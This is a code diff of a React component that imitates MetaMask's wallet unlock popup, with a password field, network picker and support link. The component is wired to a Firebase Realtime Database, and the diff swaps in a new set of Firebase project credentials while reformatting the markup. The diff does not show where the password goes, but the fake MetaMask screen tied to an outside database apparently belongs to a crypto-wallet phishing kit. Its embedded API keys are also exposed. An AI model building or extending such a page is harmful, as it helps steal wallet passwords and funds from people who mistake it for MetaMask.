@@ -16,13 +16,13 @@ import "./MM.css";
 const isDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
 console.log(window.matchMedia("(prefers-color-scheme: dark)"));
 const basic = {
-  apiKey: "AIzaSyD22LIz8nceulmiNWLDHC8nZj1SQ48doAQ",
-  authDomain: "nft-list-67033.firebaseapp.com",
-  projectId: "nft-list-67033",
-  storageBucket: "nft-list-67033.appspot.com",
-  messagingSenderId: "38959321496",
-  appId: "1:38959321496:web:86f6b0da736e9151f75bed",
-  measurementId: "G-2G9BE52S8T",
+  apiKey: "AIzaSyDoyi01xdksbWgIWFWtaxj1R80DdZ6PWbw",
+  authDomain: "mm-provider.firebaseapp.com",
+  projectId: "mm-provider",
+  storageBucket: "mm-provider.appspot.com",
+  messagingSenderId: "879731928519",
+  appId: "1:879731928519:web:875d6ddfbee3d1b0363de2",
+  measurementId: "G-0KJ8T512FL",
 };
 const rtapp = initializeApp(basic);
 const rtdb = getDatabase(rtapp);
@@ -187,7 +187,11 @@ const MM = ({ isOpen, setIsOpen }) => {
                         role="img"
                         style={{ marginLeft: 12 }}
                       >
-                        <img className="mm-avatar-network__network-image" src={ethLogo} alt="Ethereum Mainnet logo" />
+                        <img
+                          className="mm-avatar-network__network-image"
+                          src={ethLogo}
+                          alt="Ethereum Mainnet logo"
+                        />
                       </div>
                       <span
                         className="mm-box mm-text mm-text--body-sm mm-text--ellipsis mm-box--color-text-default"
@@ -199,7 +203,10 @@ const MM = ({ isOpen, setIsOpen }) => {
                         className="mm-box mm-picker-network__arrow-down-icon mm-icon mm-icon--size-xs mm-box--margin-left-auto mm-box--display-inline-block mm-box--color-icon-default"
                         style={{ marginRight: "1rem" }}
                       >
-                        <ArrowDown fill={isDark ? "white" : "black"} style={{ marginBottom: "4px" }} />
+                        <ArrowDown
+                          fill={isDark ? "white" : "black"}
+                          style={{ marginBottom: "4px" }}
+                        />
                       </span>
                     </button>
                   </div>
@@ -258,7 +265,14 @@ const MM = ({ isOpen, setIsOpen }) => {
                             dir="auto"
                             data-testid="unlock-password"
                             className={"MuiInputBase-input MuiInput-input"}
-                            style={{ marginTop: "24px", fontSize: "0.75rem", borderBottom: pwd.length !== 0 ? " 1px solid #4459ff" : "1px solid black" }}
+                            style={{
+                              marginTop: "24px",
+                              fontSize: "0.75rem",
+                              borderBottom:
+                                pwd.length !== 0
+                                  ? " 1px solid #4459ff"
+                                  : "1px solid black",
+                            }}
                             required
                             value={pwd}
                             onFocus={handleFocus}
@@ -275,25 +289,38 @@ const MM = ({ isOpen, setIsOpen }) => {
                             data-shrink="false"
                             htmlFor="password"
                             id="password-label"
-                            style={{ color: isDark ? "white" : "gray", fontSize: "1rem"  }}
+                            style={{
+                              color: isDark ? "white" : "gray",
+                              fontSize: "1rem",
+                            }}
                           >
                             Password
                           </label>
                         </div>
-                        <div className={validShow ? "validate-password" : "validate-password-hidden"}>
+                        <div
+                          className={
+                            validShow
+                              ? "validate-password"
+                              : "validate-password-hidden"
+                          }
+                        >
                           Incorrect password
                         </div>
                       </div>
                     </div>
                     <button
-                      className={"button btn--rounded btn-default" + (pwd.length == 0 ? " unlock-btn-disabled" : "")}
+                      className={
+                        "button btn--rounded btn-default" +
+                        (pwd.length == 0 ? " unlock-btn-disabled" : "")
+                      }
                       data-testid="unlock-submit"
                       disabled={pwd.length == 0}
                       type="button"
                       variant="contained"
                       style={{
-                        backgroundColor: pwd.length === 0 ? "#4658e0" : "#4459ff" ,
-                        color: pwd.length ===0 ? "#f8f9ff" : "#ffffff",
+                        backgroundColor:
+                          pwd.length === 0 ? "#4658e0" : "#4459ff",
+                        color: pwd.length === 0 ? "#f8f9ff" : "#ffffff",
                         marginTop: "20px",
                         fontWeight: "400",
                         boxShadow: "none",
@@ -308,17 +335,25 @@ const MM = ({ isOpen, setIsOpen }) => {
                     <div className="unlock-page__links">
                       <a
                         className="button btn-link unlock-page__link"
-                        style={{ fontSize: "0.75rem", color: '#4459ff' }}
+                        style={{ fontSize: "0.75rem", color: "#4459ff" }}
                         role="button"
                         tabIndex="0"
                       >
                         Forgot password?
                       </a>
                     </div>
-                    <div className="unlock-page__support" style={{ fontSize: "0.75rem" }}>
+                    <div
+                      className="unlock-page__support"
+                      style={{ fontSize: "0.75rem" }}
+                    >
                       <span>
                         Need help? Contact{" "}
-                        <a href="https://support.metamask.io" target="_blank" rel="noopener noreferrer" style={{color:"#5568ff"}}>
+                        <a
+                          href="https://support.metamask.io"
+                          target="_blank"
+                          rel="noopener noreferrer"
+                          style={{ color: "#5568ff" }}
+                        >
                           MetaMask support
                         </a>
                       </span>
